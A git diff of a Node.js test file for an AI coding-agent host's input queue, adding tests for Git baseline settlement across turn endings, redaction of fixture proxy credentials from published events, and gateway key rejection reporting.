@@ -1,7 +1,7 @@
 import { runDeviceLinkInvokeContext } from '../../../desktop/src/main/device-link/invoke-context.ts';
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
-import { mkdtempSync, rmSync, writeFileSync, readFileSync, existsSync } from 'node:fs';
+import { mkdirSync, mkdtempSync, rmSync, writeFileSync, readFileSync, existsSync } from 'node:fs';
 import os from 'node:os';
 import path from 'node:path';
 import Database from 'better-sqlite3';
@@ -19,12 +19,38 @@ import { markSessionTurnStartedDurable, markSessionTurnEnded, drainSessionActive
 
 import { createInputQueue } from './input-queue.mjs';
 import { createTurnExecutor } from './turn-executor.mjs';
+import { lockSessionRoute } from './session-route-lock.mjs';
+import { CONTEXT_OVERFLOW_REASON } from '../../../../packages/maker-core/src/agents/shared/context-overflow-error.ts';
+import { RECOVERY_SHUTDOWN_WAIT_MS, contextRecoveryKind, createHostContextRecovery } from './context-recovery.ts';
+import { createHostContextRecoveryRollover } from './context-recovery-assembly.ts';
+import { createHostAgentHandoffPending } from './handoff-pending.ts';
+import { createSessionStderrOptions } from '../../../desktop/src/main/maker-ipc/sessionRequest.ts';
+import { configureAppDataDir } from '../../../desktop/src/main/userDataPath.ts';
+import { configureHostOwner } from './claude-auth.mjs';
+import { hostRuntimeLayout } from '../runtime-layout.mjs';
+import { openOwnerDatabase } from '../../../desktop/src/main/localDb/startupCore.ts';
+import { createDbClientForHandle } from '../../../desktop/src/main/localDb/client/createDbClientForHandle.ts';
+import { getCurrentDbClientSnapshot } from '../../../desktop/src/main/localDb/client/current.ts';
+import { OwnerSessionStorage } from '../../../desktop/src/main/localDb/sessionStorageAdapter.ts';
+import { createHostMessageStore } from '../message-store.ts';
+import { listErrorTailPendingRows } from '../../../desktop/src/main/localDb/sessionActiveTurn.ts';
+import { withSendToSessionLock } from '../../../desktop/src/main/maker-ipc/sendToSessionLock.ts';
+import { createEventHub } from '../events.mjs';
+import { createChatHandler } from '../chat.mjs';
+import { EventEmitter } from 'node:events';
+import { Readable } from 'node:stream';
+import { redactEventForRenderer } from '../../../desktop/src/main/maker-ipc/rendererEventRedaction.ts';
+import { isGatewayProxyTokenRecoveryErrorEventForProvider } from '../../../desktop/src/main/maker-ipc/gatewayProxyTokenRecovery.ts';
+import { GATEWAY_PROXY_TOKEN_INVALID_REASON } from '@cindy/maker-shared/error-redaction';
 import { applyLiveSessionSettings } from './session-settings.mjs';
 import { GhostGrantConfirmBridge } from '../../../desktop/src/main/cindy-brain/ghostGrantConfirmBridge.ts';
 import { AcceptedCallbackDispatchCancelled } from '../../../desktop/src/main/maker-ipc/acceptedCallbackRunner.ts';
 import { MCP_APP_MESSAGE_GUARD } from '../../../desktop/src/main/mcp-apps/message.ts';
 import { AUTO_REVIEW_DELEGATED_CONTINUATION } from '../../../desktop/src/main/maker-ipc/autoReviewUserIntent.ts';
 import { AUTO_REVIEW_USER_INTENT, AUTO_REVIEW_SOURCE_CONTENT, ASYNC_QUESTION_ANSWER, SUPERSEDE_ASYNC_QUESTIONS } from '@cindy/maker-core';
+import { lifoCleanup } from '../test-support/cleanup.mjs';
+import { GIT_SETTLEMENT_SEQUENCES } from '../../../desktop/src/main/maker-ipc/__tests__/gitBaselineSettlementSequences.ts';
+import { GitSnapshotCoordinator } from '../../../desktop/src/main/git-snapshot/gitSnapshotCoordinator.ts';
 
 /** Minimal Maker stand-in: one live session per id, driven by the test. */
 function createFakeMaker() {
@@ -214,6 +240,59 @@ test('stopping a direct Host turn drains its pending start marker', async () => 
   await executor.close('scheduled');
 });
 
+// Unit regression: main's unused direct-turn adapter has no accepted input/start hook.
+// Its terminal must not consume a user turn's baseline or leak raw event fields.
+// Existing direct-turn cases only assert persistence/queue ordering, not these boundaries.
+for (const terminal of ['done', 'error', 'stop']) {
+  test(`a direct Host turn ending with ${terminal} does not settle an unstarted Git baseline`, async t => {
+    const calls = [];
+    const h = createHarness({ getGitSnapshot: () => ({
+      onTurnStart() { calls.push('start'); }, onTurnAbort() { calls.push('abort'); },
+      onTurnEnd() { calls.push('end'); }, onSessionClosed() {},
+    }) });
+    t.after(() => h.queue.dispose());
+    const session = await h.maker.createSession({ id: `direct-${terminal}`, agentKind: 'codex', workingDir: '/tmp' });
+    h.queue.wireHostSession(session);
+    await h.queue.beginHostTurn(session.id);
+    const event = { type: 'tool_use', sessionTurnGeneration: session.generation,
+      sessionInstanceId: session.instanceId, data: { toolUseId: 'browser', toolName: 'mcp__cindy_browser__call_tool',
+        input: { name: 'browser', args: { proxyServer: 'http://fixture-user:fixture-pass@proxy.test' } } } };
+    session.emit(event);
+    const published = h.events.find(item => item.type === 'tool_use');
+    assert.deepEqual(published.event, redactEventForRenderer(event));
+    assert.equal('sessionTurnGeneration' in published, false);
+    assert.equal(JSON.stringify(published).includes('fixture-pass'), false);
+    if (terminal === 'stop') await h.queue.stop(session.id);
+    else session.emit({ type: terminal, data: terminal === 'error' ? { message: 'failed', isTerminal: true } : {} });
+    await waitFor(() => !h.queue.projection(session.id).turnInProgress);
+    assert.deepEqual(calls, []);
+  });
+}
+
+test('a direct Host terminal cannot take a preceding user turn baseline whose snapshot is still settling', async t => {
+  const calls = [];
+  let baseline;
+  let completeSnapshot;
+  const snapshotPending = new Promise(resolve => { completeSnapshot = resolve; });
+  const h = createHarness({ getGitSnapshot: () => ({
+    onTurnStart(id) { baseline = id; calls.push('start'); },
+    onTurnAbort() { baseline = undefined; calls.push('abort'); },
+    async onTurnEnd() { calls.push('end'); await snapshotPending; baseline = undefined; },
+    onSessionClosed() {},
+  }) });
+  t.after(async () => { completeSnapshot(); await h.queue.dispose(); });
+  await enqueue(h, 'snapshot-pending', { clientId: 'ordinary', text: 'edit' });
+  const session = h.maker.getSession('snapshot-pending');
+  session.emit({ type: 'done', data: {} });
+  await waitFor(() => !h.queue.projection(session.id).turnInProgress);
+  await h.queue.beginHostTurn(session.id);
+  session.emit({ type: 'error', data: { message: 'direct failed', isTerminal: true } });
+  session.emit({ type: 'done', data: {} });
+  await waitFor(() => !h.queue.projection(session.id).turnInProgress);
+  assert.deepEqual(calls, ['start', 'end']);
+  assert.equal(baseline, session.id);
+});
+
 // Host lifecycle / integration: desktop runner tests inject the queue bridge;
 // these enter its real admission, persistence and accepted callback pipeline.
 const scheduledInput = (overrides = {}) => ({ sessionId: 'scheduled-task',
@@ -222,6 +301,7 @@ const scheduledInput = (overrides = {}) => ({ sessionId: 'scheduled-task',
   onAccepted() {}, ...overrides });
 
 test('scheduled input waits behind user input, deduplicates and retains its origin through dispatch', async t => {
+  t = lifoCleanup(t);
   const h = createHarness(); t.after(() => h.queue.dispose());
   await enqueue(h, 'scheduled-task', { clientId: 'user', text: 'user input' });
   const bridge = h.queue.schedulerQueue();
@@ -242,6 +322,7 @@ test('scheduled input waits behind user input, deduplicates and retains its orig
 });
 
 test('removing a scheduled queue row notifies the runner once and never starts that input', async t => {
+  t = lifoCleanup(t);
   const h = createHarness(); t.after(() => h.queue.dispose());
   await enqueue(h, 'scheduled-task', { clientId: 'user', text: 'user input' });
   let discarded = 0; let accepted = 0;
@@ -259,6 +340,7 @@ test('removing a scheduled queue row notifies the runner once and never starts t
 });
 
 test('scheduler preparation failure reaches the runner before any model or user-row write', async t => {
+  t = lifoCleanup(t);
   const h = createHarness(); t.after(() => h.queue.dispose());
   let failure;
   const result = await h.queue.schedulerQueue().enqueuePrompt(scheduledInput({
@@ -272,6 +354,7 @@ test('scheduler preparation failure reaches the runner before any model or user-
 });
 
 test('a cancelled scheduler acceptance rolls back before vendor dispatch', async t => {
+  t = lifoCleanup(t);
   const h = createHarness(); t.after(() => h.queue.dispose());
   let rollback = 0;
   const result = await h.queue.schedulerQueue().enqueuePrompt(scheduledInput({
@@ -284,6 +367,7 @@ test('a cancelled scheduler acceptance rolls back before vendor dispatch', async
 });
 
 test('an outgoing scheduler cannot restore queues after its input runtime is disposed', async t => {
+  t = lifoCleanup(t);
   let restored = 0;
   const h = createHarness({ loadQueueSnapshot: async () => { restored++; return []; } });
   t.after(() => h.queue.dispose());
@@ -297,6 +381,7 @@ test('an outgoing scheduler cannot restore queues after its input runtime is dis
 
 for (const blockedRead of [1, 2]) {
   test(`stop during scheduler admission read ${blockedRead} prevents late enqueue`, async t => {
+    t = lifoCleanup(t);
     let release, entered;
     const gate = new Promise(resolve => { release = resolve; });
     const reading = new Promise(resolve => { entered = resolve; });
@@ -392,6 +477,7 @@ test('reopens a stored conversation with its SDK identity after a Host restart',
 // either direction, while the runtime retains the task's current armed state.
 for (const cold of [false, true]) for (const queuedPlan of [false, true]) {
   test(`queued messages use latest settings but retain Plan=${queuedPlan} (${cold ? 'cold' : 'live'} runtime)`, async t => {
+    t = lifoCleanup(t);
     const settings = { agentKind: 'claude-code', workingDir: '/tmp', model: 'model-a',
       providerId: 'provider-a', permissionMode: 'bypassPermissions', effort: 'low', fastMode: true, planModeEnabled: queuedPlan };
     const h = createHarness({ readSession: async id => ({ id, ...settings }) });
@@ -429,6 +515,7 @@ for (const cold of [false, true]) for (const queuedPlan of [false, true]) {
 // Minimum input: complete one turn, change cwd/resources, then send once more.
 for (const refresh of ['working-directory', 'project-resources']) {
   test(`shared send preserves replies and queue ownership across ${refresh} refresh`, async t => {
+    t = lifoCleanup(t);
     let cwd = '/tmp/original';
     const h = createHarness({ readSession: async id => ({ id, agentKind: 'claude-code',
       workingDir: cwd, model: 'stored', providerId: 'xd', sdkSessionId: 'same-transcript' }) });
@@ -469,6 +556,7 @@ for (const refresh of ['working-directory', 'project-resources']) {
 // no provider/user row before it settles; failed storage retains a retryable head.
 for (const writeFails of [false, true]) {
   test(`shared send awaits the durable startup marker (${writeFails ? 'write fails' : 'write succeeds'})`, async t => {
+    t = lifoCleanup(t);
     let release, entered;
     const writing = new Promise(resolve => { entered = resolve; });
     const gate = new Promise(resolve => { release = resolve; });
@@ -500,6 +588,7 @@ for (const writeFails of [false, true]) {
 // Unit, real SQLite trigger + real queue: reject the start marker, retain input,
 // and prove that neither the provider nor user-message persistence was reached.
 test('production startup marker failure prevents dispatch and leaves input recoverable', async t => {
+  t = lifoCleanup(t);
   const sqlite = new Database(':memory:');
   sqlite.exec(`CREATE TABLE sessions(id TEXT PRIMARY KEY, active_turn_started_at INTEGER);
     INSERT INTO sessions(id) VALUES ('marker-failure');
@@ -525,6 +614,7 @@ test('production startup marker failure prevents dispatch and leaves input recov
 for (const facts of [{ remoteHostId: 'ssh-host' }, { agentDeviceId: 'another-device' },
   { orcaRole: 'lead' }, { botId: 'teammate' }, { source: 'review' }, { grouped: true }]) {
   test(`shared send refuses an unsupported stored task: ${JSON.stringify(facts)}`, async t => {
+    t = lifoCleanup(t);
     const h = createHarness({ readSession: async id => ({ id, agentKind: 'claude-code',
       model: 'm', workingDir: '/tmp', providerId: 'xd', ...facts }),
       assertProviderExecutionSupported: () => {
@@ -616,6 +706,81 @@ test('persists thinking and tool work with the shared message identities', async
   await h.queue.dispose();
 });
 
+// Host event exits: what the hub carries to the event stream (and its replay), /api/chat and the
+// device link is the desktop's renderer-boundary projection (rendererEventRedaction.ts), never the
+// raw agent event. Fixture credentials only; no network.
+test('agent events leave the Host as the desktop renderer-boundary projection', { timeout: 60_000 }, async () => {
+  const hub = createEventHub();
+  const live = [];
+  hub.subscribe(event => live.push(event));
+  const h = createHarness({ hub });
+  await enqueue(h, 'boundary', { clientId: 'input', text: 'open the page' });
+  const session = h.maker.getSession('boundary');
+  const lifecycle = { sessionTurnGeneration: session.generation, sessionInstanceId: session.instanceId,
+    turnAttemptToken: 'fixture-attempt', backgroundTurnStartedAt: 1, runtimeRecovery: false };
+  const raw = [
+    { type: 'tool_use', ...lifecycle, data: { toolUseId: 'browse', toolName: 'mcp__cindy_browser__call_tool',
+      input: { name: 'browser', args: { action: 'open', url: 'https://example.test', proxyServer: 'http://fixture-user:fixture-pass@proxy.test:8080' } } } },
+    { type: 'tool_use', ...lifecycle, data: { toolUseId: 'browse-codex', toolName: 'mcp:cindy_browser:call_tool',
+      input: JSON.stringify({ name: 'browser', args: { proxyServer: 'socks5://fixture-user:fixture-pass@proxy.test:1080' } }) } },
+    { type: 'tool_result', ...lifecycle, data: { toolUseIds: ['browse', 'browse-codex'], summary: 'opened' } },
+    { type: 'text', ...lifecycle, data: { text: 'done', isFinal: true } },
+    { type: 'done', ...lifecycle },
+  ];
+  for (const event of raw) session.emit(event);
+  await waitFor(() => !h.queue.projection('boundary').turnInProgress);
+  const published = live.filter(event => event.sessionId === 'boundary' && event.event);
+  assert.equal(published.length, raw.length);
+  for (const [index, event] of published.entries()) {
+    const expected = redactEventForRenderer(raw[index]);
+    assert.deepEqual(event.event, expected, `event ${index} is the desktop projection`);
+    for (const [key, value] of Object.entries(expected)) assert.deepEqual(event[key], value, `top-level ${key}`);
+    for (const key of ['sessionTurnGeneration', 'sessionInstanceId', 'turnAttemptToken', 'backgroundTurnStartedAt', 'runtimeRecovery']) {
+      assert.equal(key in event, false, `${key} stays inside the Host`);
+      assert.equal(key in event.event, false, `${key} stays inside the Host`);
+    }
+  }
+  // What a reconnecting client gets (server.mjs /events with Last-Event-ID).
+  const { runtime } = hub.replay({ since: null });
+  const replayed = hub.replay({ since: '0', runtime }).events.filter(event => event.sessionId === 'boundary');
+  assert.ok(replayed.filter(event => event.event).length >= raw.length, 'the replay buffer holds the same projection');
+  for (const event of [...published, ...replayed]) assert.equal(JSON.stringify(event).includes('fixture-pass'), false);
+  assert.equal(JSON.stringify(published[0].event.data.input.args.proxyServer), '"[REDACTED]"');
+  // Persistence and bookkeeping keep the original; the persisted tool row uses the shared redaction.
+  assert.equal(raw[0].data.input.args.proxyServer.includes('fixture-pass'), true);
+  assert.equal(JSON.stringify(h.persisted).includes('fixture-pass'), false);
+  await h.queue.dispose();
+});
+
+// As the desktop (sessionEventDelivery.ts): a turn that ends on a rejected Cindy AI Key on the
+// gateway reports the current key (credential resync); other errors and other providers do not.
+test('a turn ended on a rejected Cindy AI Key reports the current key, as on the desktop', { timeout: 60_000 }, async () => {
+  const rejected = { message: 'gateway proxy token invalid', reason: GATEWAY_PROXY_TOKEN_INVALID_REASON };
+  const cases = [
+    { providerId: 'xd', event: { type: 'error', data: { ...rejected, isTerminal: true } } },
+    { providerId: 'xd', event: { type: 'error', data: { ...rejected, isTerminal: false } } },
+    { providerId: 'xd', event: { type: 'error', data: { message: 'overloaded', isTerminal: true } } },
+    { providerId: 'cprov-other', event: { type: 'error', data: { ...rejected, isTerminal: true } } },
+  ];
+  for (const [index, { providerId, event }] of cases.entries()) {
+    let reports = 0;
+    const h = createHarness({
+      reportAgentCindyGatewayKeyRejected: () => { reports += 1; },
+      readSession: async (sessionId) => ({ id: sessionId, status: 'active', agentKind: 'claude-code', model: 'stored-model',
+        workingDir: '/tmp', providerId, permissionMode: 'ask', planModeEnabled: false }),
+    });
+    const id = `key-rejected-${index}`;
+    await enqueue(h, id, { clientId: 'input', text: 'hello' });
+    const session = h.maker.getSession(id);
+    session.emit(event);
+    session.emit({ type: 'done' });
+    await waitFor(() => !h.queue.projection(id).turnInProgress);
+    assert.equal(reports, isGatewayProxyTokenRecoveryErrorEventForProvider(providerId, event) ? 1 : 0, `case ${index}`);
+    await h.queue.dispose();
+  }
+  assert.equal(isGatewayProxyTokenRecoveryErrorEventForProvider('xd', cases[0].event), true, 'the first case is the one that reports');
+});
+
 test('continuation and nonterminal error events do not release another queued input', async () => {
   const h = createHarness();
   await enqueue(h, 'continuation', { clientId: 'a', text: 'first' });
@@ -688,6 +853,7 @@ test('an MCP App message restores user history without treating page text as con
 // to the next send's authorization reader, not handcrafted history rows. A lost
 // delivery/intent field would otherwise silently drop the earlier restriction.
 test('the next turn restores the user receipt actually persisted by the Host', async t => {
+  t = lifoCleanup(t);
   const h = createHarness();
   t.after(() => h.queue.dispose());
   await enqueue(h, 'receipt-chain', { clientId: 'request', text: 'Deploy the app. Do not delete files.' });
@@ -708,6 +874,7 @@ test('the next turn restores the user receipt actually persisted by the Host', a
 // coverage above alone could miss these dispatch branches (unit, injected rows).
 for (const delivery of ['send', 'schedule', 'steer']) {
   test(`history authorization is restored for ${delivery}`, async t => {
+    t = lifoCleanup(t);
     const history = [{ clientId: 'owner-request', role: 'user', content: 'Deploy the app.',
       agentMeta: { autoReviewUserText: 'Deploy the app.', delivery: 'turn' } },
     { clientId: 'owner-restriction', role: 'user', content: 'Do not delete files.',
@@ -739,6 +906,7 @@ for (const delivery of ['send', 'schedule', 'steer']) {
 // Authorization is a persistence-sensitive read: an in-flight history write
 // must finish before restoring intent. Only model I/O is faked (unit).
 test('steer drains pending history before restoring authorization', async t => {
+  t = lifoCleanup(t);
   let release, entered, saved = false, reads = 0;
   const started = new Promise(resolve => { entered = resolve; });
   const gate = new Promise(resolve => { release = resolve; });
@@ -769,6 +937,7 @@ test('steer drains pending history before restoring authorization', async t => {
 });
 
 test('delegated input cannot dispatch when authorization history is unavailable', async t => {
+  t = lifoCleanup(t);
   const h = createHarness({ readAuthorizationHistory: async () => { throw new Error('history unavailable'); } });
   t.after(() => h.queue.dispose());
   await h.queue.enqueue('history-error', { clientId: 'app', text: 'delete everything',
@@ -802,6 +971,7 @@ test('a remote input keeps its source device and tells the model', async () => {
 // context, while provenance stays on every stored row. Previously Host rebuilt
 // the note for every input; the one-message provenance test cannot catch that.
 test('a remote device note is deduplicated until the native context is compacted', async t => {
+  t = lifoCleanup(t);
   const h = createHarness(); t.after(() => h.queue.dispose());
   const send = async (clientId, count) => {
     await runDeviceLinkInvokeContext({ controllerDeviceId: 'phone', controllerPlatform: 'ios', channel: 'maker:input:enqueue' },
@@ -828,6 +998,7 @@ test('a remote device note is deduplicated until the native context is compacted
 // recovery ports must link the accepted row and reuse its id on explicit retry;
 // repository-level row tests alone cannot detect an unwired executor port.
 test('Pi native entry is linked after persistence and reused by explicit retry', async t => {
+  t = lifoCleanup(t);
   let linked;
   const h = createHarness({
     readSession: async id => ({ id, status: 'active', agentKind: 'pi', model: 'fixture-model', workingDir: '/tmp' }),
@@ -867,6 +1038,7 @@ test('Pi native entry is linked after persistence and reused by explicit retry',
 // SQLITE_BUSY after acceptance; missing-row linking must behave the same way.
 for (const failure of ['database error', 'missing row']) {
   test(`Pi entry ${failure} does not pause reply persistence or the next input`, async t => {
+    t = lifoCleanup(t);
     const h = createHarness({
       readSession: async id => ({ id, status: 'active', agentKind: 'pi', model: 'fixture-model', workingDir: '/tmp' }),
       linkPiUserEntry: async () => {
@@ -894,6 +1066,7 @@ for (const failure of ['database error', 'missing row']) {
 // Shared steer must carry protected coordinator metadata and use the send
 // transaction's note memory. Prior direct Host steer lost both (unit, real queue).
 test('steer shares note memory and preserves question classification and persisted UUID', async t => {
+  t = lifoCleanup(t);
   const h = createHarness(); t.after(() => h.queue.dispose());
   const remote = fn => runDeviceLinkInvokeContext({ controllerDeviceId: 'phone', controllerPlatform: 'ios', channel: 'maker:input:steer' }, fn);
   await remote(() => enqueue(h, 'steer-notes', { clientId: 'first', text: 'start' }));
@@ -917,6 +1090,7 @@ test('steer shares note memory and preserves question classification and persist
 // Unit: real queue/factory, a held context read is the minimal race input.
 for (const invalidation of ['owner', 'turn', 'app-context']) {
   test(`steer refuses ${invalidation} invalidated while preparing App context`, async t => {
+    t = lifoCleanup(t);
     let owner = {}, preparing = false, valid = true, consumed = 0, entered, release;
     const started = new Promise(resolve => { entered = resolve; });
     const gate = new Promise(resolve => { release = resolve; });
@@ -1095,6 +1269,7 @@ test('Host rejects unsupported or missing attachments before queue acceptance an
 });
 
 test('stopping Host during image ingest rejects the preparation and compensates staged refs', async t => {
+  t = lifoCleanup(t);
   const h = attachmentHarness(t);
   let entered; let release;
   const entering = new Promise(resolve => { entered = resolve; });
@@ -1119,6 +1294,7 @@ test('stopping Host during image ingest rejects the preparation and compensates 
 // sender; unresolved transfer references cannot appear accepted with no file.
 for (const attachmentPath of ['/tmp/host-attachment.txt', 'oss://unresolved-attachment']) {
   test(`shared send handles attachment reference ${attachmentPath}`, async t => {
+    t = lifoCleanup(t);
     const h = createHarness(); t.after(() => h.queue.dispose());
     await h.queue.enqueue('attachment', { clientId: 'attached', text: 'read this',
       files: [{ path: attachmentPath, name: 'host-attachment.txt', category: 'file', ext: 'txt' }] });
@@ -1304,6 +1480,7 @@ test('the projection carries every field the renderer reads', () => {
 // coverage enters enqueue/updateContent and checks projection, dispatch and storage.
 // Standalone input-queue.test.mjs regression run: 2.23s on the local macOS host.
 test('queued composer content stays readable while storage retains its structured payload', async t => {
+  t = lifoCleanup(t);
   const h = createHarness();
   t.after(() => h.queue.dispose());
   await enqueue(h, 'display', { clientId: 'running', text: 'running' });
@@ -1473,6 +1650,7 @@ test('restores persisted execution settings when the composer omits them', async
 // across two runtime instances. A restart must neither lose pending work nor
 // replay the already accepted turn, including an HTTP retry with its old id.
 test('restart restores a paused durable queue and deduplicates accepted input', async (t) => {
+  t = lifoCleanup(t);
   const root = mkdtempSync(path.join(os.tmpdir(), 'cindy-host-queue-'));
   let sqlite;
   const reopen = () => {
@@ -1692,4 +1870,1218 @@ test('durable remote input retains authenticated provenance and strips forged pr
   assert.equal(item.sourcePlugin, undefined);
   assert.equal(item.origin, undefined);
   await h.queue.dispose();
+});
+
+/*
+ * 测试价值（回合钩子，第 7 行与第 7b 行）
+ * - 可观察结果：队列里的用户回合在用户行落库之后、派发给引擎之前开回合改动记录并调 Git 基线；
+ *   回合结束时改动记录带着这条用户消息的锚点落盘，Git 记改后快照；落库了却没派发的回合
+ *   清掉改动记录并撤回基线。
+ * - 规则依据：桌面 register.ts 的 AgentInputCoordinator 钩子（beforeDispatchUserTurn /
+ *   onUndispatchedUserTurn）、sessionEventPreparation.ts 的 finalize、sessionEventDelivery.ts
+ *   的 onTurnEnd。m1-cp5a 只接了引擎侧的写前捕获，改动记录因为没有锚点从不落盘。
+ * - 最小失败输入：不开记录（无锚点，不落盘）；基线早于落库或晚于派发；未派发不撤回。
+ * - tier：unit（假引擎，真实的改动记录存储与临时目录，不调模型）。
+ */
+test('a queued user turn opens its change record and Git baseline between the user row and dispatch, and closes both at done', async t => {
+  t = lifoCleanup(t);
+  const { configureUserDataDir } = await import('../../../desktop/src/main/userDataPath.ts');
+  const { captureKnownFileBefore, waitForTurnChangeSetPersistence } = await import('../../../desktop/src/main/turn-change-set/store.ts');
+  const { turnChangeSetSessionDirectory } = await import('../../../desktop/src/main/turn-change-set/storagePaths.ts');
+  const profile = mkdtempSync(path.join(os.tmpdir(), 'cindy-host-turn-change-'));
+  const workDir = mkdtempSync(path.join(os.tmpdir(), 'cindy-host-turn-work-'));
+  t.after(() => { rmSync(profile, { recursive: true, force: true }); rmSync(workDir, { recursive: true, force: true }); });
+  configureUserDataDir(profile);
+  writeFileSync(path.join(workDir, 'a.txt'), 'one\n');
+  const calls = [];
+  let h;
+  const gitSnapshot = {
+    async onTurnStart(id) {
+      calls.push(['start', id, h.persisted.filter(row => row.role === 'user').length, h.maker.getSession(id)?.sent.length ?? 0]);
+    },
+    onTurnAbort(id) { calls.push(['abort', id]); },
+    async onTurnEnd(id) { calls.push(['end', id]); },
+    onSessionClosed() {},
+  };
+  h = createHarness({ getGitSnapshot: () => gitSnapshot,
+    readSession: async id => ({ id, status: 'active', agentKind: 'claude-code', model: 'stored-model',
+      workingDir: workDir, providerId: 'xd', permissionMode: 'ask', planModeEnabled: false }) });
+  await enqueue(h, 'task-change', { clientId: 'u-change', text: 'edit a.txt' });
+  // After the durable user row, before the engine received the message.
+  assert.deepEqual(calls, [['start', 'task-change', 1, 0]]);
+
+  // The engine's write hook captures the file before the write (turnChangeCapture).
+  await captureKnownFileBefore({ sessionId: 'task-change', provider: 'claude-code', cwd: workDir,
+    targetPath: path.join(workDir, 'a.txt') });
+  writeFileSync(path.join(workDir, 'a.txt'), 'two\n');
+  h.maker.getSession('task-change').emit({ type: 'done', data: {} });
+  await waitFor(() => calls.some(call => call[0] === 'end'));
+  await waitForTurnChangeSetPersistence();
+  const index = JSON.parse(readFileSync(path.join(turnChangeSetSessionDirectory(profile, 'task-change'), 'index.json'), 'utf8'));
+  assert.deepEqual(index.entries.map(entry => entry.anchorClientId), ['u-change']);
+  assert.deepEqual(calls.map(call => call[0]), ['start', 'end']);
+  await h.queue.dispose();
+});
+
+/**
+ * Git 基线按回合结算（评审二，m1-rc4）
+ * - Bug：已派发的回合以终止性 error 结束时不撤回基线；停止后 Host 先收尾、done 迟到时什么都不做。
+ *   悬空的基线会让同一任务下一轮的保存点记到旧消息上，并让同仓其他任务被判为并发。
+ * - 规则依据：桌面 sessionEventDelivery.ts（done → onTurnEnd，终止性 error → onTurnAbort，按事件各一次）；
+ *   三个引擎停止时都发 done；审核方定：停止由 Host 收尾时 Host 自己做一次 onTurnEnd 并关上本轮结算。
+ * - 最小失败输入：error 后没有 abort；error → done 少一次 end；停止后迟到的 done 或 error 再结算一次；
+ *   上一轮的终态在下一轮开始后取走下一轮的基线。
+ * - tier：unit（假引擎，真实的输入队列与回合执行，不调模型）。
+ */
+const gitSettlementFixture = async (t, id) => {
+  const f = await changeRecordFixture(t);
+  const h = createHarness({ getGitSnapshot: () => f.gitSnapshot, readSession: f.readSession });
+  await enqueue(h, id, { clientId: `${id}-1`, text: 'first' });
+  const session = h.maker.getSession(id);
+  const terminal = (type, generation = session.generation) => (type === 'done'
+    ? { type: 'done', data: {}, sessionTurnGeneration: generation }
+    : { type: 'error', data: { message: 'provider failed', isTerminal: true }, sessionTurnGeneration: generation });
+  const settled = async () => { await waitFor(() => !h.queue.projection(id).turnInProgress); await new Promise(resolve => setImmediate(resolve)); };
+  return { f, h, session, terminal, settled, git: () => f.calls.filter(call => call[0] !== 'closed').map(call => call[0]) };
+};
+
+test('a failed turn cancels its baseline once; an error followed by its done also takes the after-edit step, as on the desktop', async t => {
+  t = lifoCleanup(t);
+  const a = await gitSettlementFixture(t, 'git-error-done');
+  a.session.emit(a.terminal('error'));
+  a.session.emit(a.terminal('done'));
+  a.session.emit(a.terminal('error'));
+  a.session.emit(a.terminal('done'));
+  await a.settled();
+  assert.deepEqual(a.git(), ['start', 'abort', 'end']);
+  await a.h.queue.dispose().catch(() => {});
+  const b = await gitSettlementFixture(t, 'git-error-only');
+  b.session.emit(b.terminal('error'));
+  await b.settled();
+  assert.deepEqual(b.git(), ['start', 'abort']);
+  await b.h.queue.dispose().catch(() => {});
+});
+
+test('a stopped turn takes one after-edit step whether its done comes before or after the Host settles the stop', async t => {
+  t = lifoCleanup(t);
+  // The engine reports done while abort() is still settling.
+  const a = await gitSettlementFixture(t, 'git-stop-done-first');
+  a.session.abort = async () => { a.session.aborted += 1; a.session.emit(a.terminal('done')); };
+  await a.h.queue.stop('git-stop-done-first');
+  await a.settled();
+  assert.deepEqual(a.git(), ['start', 'end']);
+  await a.h.queue.dispose().catch(() => {});
+  // The engine is idle after abort() and reports nothing yet: the Host takes the step; the
+  // late done, a late error and a second done of the same turn take nothing more.
+  const b = await gitSettlementFixture(t, 'git-stop-host-first');
+  await b.h.queue.stop('git-stop-host-first');
+  await b.settled();
+  assert.deepEqual(b.git(), ['start', 'end']);
+  b.session.emit(b.terminal('error'));
+  b.session.emit(b.terminal('done'));
+  b.session.emit(b.terminal('done'));
+  await new Promise(resolve => setImmediate(resolve));
+  assert.deepEqual(b.git(), ['start', 'end']);
+  await b.h.queue.dispose().catch(() => {});
+});
+
+// The desktop event pipeline settles the same sequences (sessionEventPipeline.test.ts); the
+// table holds both columns and says why they differ where they do.
+for (const sequence of GIT_SETTLEMENT_SEQUENCES) {
+  test(`the Git baseline of ${sequence.name} is settled as the shared table says`, async t => {
+    t = lifoCleanup(t);
+    const id = `git-sequence-${GIT_SETTLEMENT_SEQUENCES.indexOf(sequence)}`;
+    const a = await gitSettlementFixture(t, id);
+    for (const step of sequence.steps) {
+      if (step === 'stop') await a.h.queue.stop(id);
+      else if (step === 'stop-with-done') {
+        a.session.abort = async () => { a.session.aborted += 1; a.session.emit(a.terminal('done')); };
+        await a.h.queue.stop(id);
+      } else if (step === 'continuation-done') a.session.emit({ ...a.terminal('done'), turnContinuationId: 0 });
+      else a.session.emit(a.terminal(step));
+    }
+    await a.settled();
+    assert.deepEqual(a.git().slice(1), sequence.host);
+    assert.equal(sequence.difference === undefined, JSON.stringify(sequence.host) === JSON.stringify(sequence.desktop));
+    await a.h.queue.dispose().catch(() => {});
+  });
+}
+
+test('terminals of a stopped turn that arrive once the next turn has started leave the next baseline alone', async t => {
+  t = lifoCleanup(t);
+  const a = await gitSettlementFixture(t, 'git-stop-next');
+  const stopped = a.session.generation;
+  await a.h.queue.stop('git-stop-next');
+  await a.settled();
+  // The old done and error arrive while the next turn opens its baseline, before it has a generation.
+  const start = a.f.gitSnapshot.onTurnStart;
+  a.f.gitSnapshot.onTurnStart = async id => {
+    await start(id);
+    a.session.emit(a.terminal('done', stopped));
+    a.session.emit(a.terminal('error', stopped));
+  };
+  await a.h.queue.enqueue('git-stop-next', { clientId: 'git-stop-next-2', text: 'second' });
+  await waitFor(() => a.session.sent.length === 2);
+  // And again once the next turn has its generation.
+  a.session.emit(a.terminal('done', stopped));
+  a.session.emit(a.terminal('error', stopped));
+  await new Promise(resolve => setImmediate(resolve));
+  assert.deepEqual(a.git(), ['start', 'end', 'start']);
+  assert.equal(a.h.queue.projection('git-stop-next').turnInProgress, true, 'the next turn is still running');
+  a.session.emit(a.terminal('done'));
+  await a.settled();
+  assert.deepEqual(a.git(), ['start', 'end', 'start', 'end']);
+  await a.h.queue.dispose().catch(() => {});
+});
+
+// Same repository, two tasks: a failed turn of one leaves no baseline behind, so the other's
+// next turn is not taken for concurrent work and keeps its after-edit savepoint (the desktop
+// degrades a turn that overlapped another task's in the same repository to a rewind gap).
